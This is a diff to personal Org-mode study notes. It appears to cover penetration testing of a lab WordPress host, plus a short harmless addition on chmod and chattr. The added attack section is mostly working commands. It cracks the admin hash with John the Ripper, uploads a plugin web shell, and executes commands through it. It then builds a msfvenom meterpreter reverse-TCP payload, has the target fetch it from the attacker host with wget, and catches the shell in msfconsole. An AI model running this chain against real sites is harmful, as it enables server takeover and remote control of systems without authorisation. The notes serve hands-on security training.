@@ -3136,14 +3136,50 @@ wpscan --url sandbox.local --enumerate ap,at,cb,dbe
     + SELECT 1,2,3,column_name,4 FROM information_schema.columns WHERE ...
       - the =SELECT 1,2,3 FROM <table>= returns 1,2,3. Use this to reveal the channel that will be displayed on the screen. For example, if only 3 is shown, then inject SELECT 1,2,column_name FROM information_schema.table
         
-*** Cracking the Password
+*** Cracking the Password -> wordpress admin account
     + wordlist: /usr/share/wordlists/rockyou.txt.gz
     #+begin_src sh
 echo "$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/" > pass.txt
 ## John the Ripper
 john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
     #+end_src
+    
+*** wordpress admin interface -> more info && web-shell(wp plugin)
+    1. enumerate admin interface -> backend server arch && db host && user
+    2. plugin-shell
+       - /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php
+       - zip the file and upload as plugin using admin gui interface.
+       - wp default plugin folder: wp-content/plugin
+       #+BEGIN_SRC sh
+curl http://host/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
+       #+END_SRC
+       
+*** webshell -> reverse-shell
+    #+BEGIN_SRC sh
+## generate an executable
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf
 
+## transfer the executable
+sudo python3 -m http.server 80
+curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph p?cmd=wget%20http://10.11.0.4/shell.elf
+
+## chmod [a]+x <exec> (encodeURIComponent(str). '+' -> '%2B'. )
+## not encodeURI(), which ignores more chars (protocol related, e.g. + @ /)
+curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph p?cmd=chmod%20%2bx%20shell.elf
+
+## start the listener
+sudo msfconsole -q -x "use exploit/multi/handler;\
+  set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
+  set LHOST 10.11.0.4;\
+  set LPORT 443;\
+  run"
+
+## invoke the executable
+curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph p?cmd=./shell.elf
+    #+END_SRC
+    
+*** Post-Exploitation Enumeration
+    // TODO
 
 
 * TODO list
@@ -4022,6 +4058,25 @@ ipython
    echo 'a' > my_pipe
    #+end_src
    
+   
+** file attributes: chmod && chattr
+*** chmod
+    + ref: [[https://askubuntu.com/questions/472812/why-is-777-assigned-to-chmod-to-permit-everything-on-a-file]]
+    + summary:
+      | user | group | other |
+      |------+-------+-------|
+      | rwx  | rwx   | rwx   |
+      - 111 111 111 -> 777
+      - 101 101 101 -> 555
+      - 111 101 101 -> 755
+        
+*** chattr && lsattr
+    + ref: [[https://man7.org/linux/man-pages/man1/chattr.1.html][man 1 chattr]]
+    + summary:
+      - chattr [+-]a    # append only
+      - chattr [+-]i    # immutable(not applied to file descriptor already opened)
+      - chattr [+-]s    # secure delete (not honored by ext2, 3, 4 fs)
+
 
 * e0cp00 Electronics, the basic
 
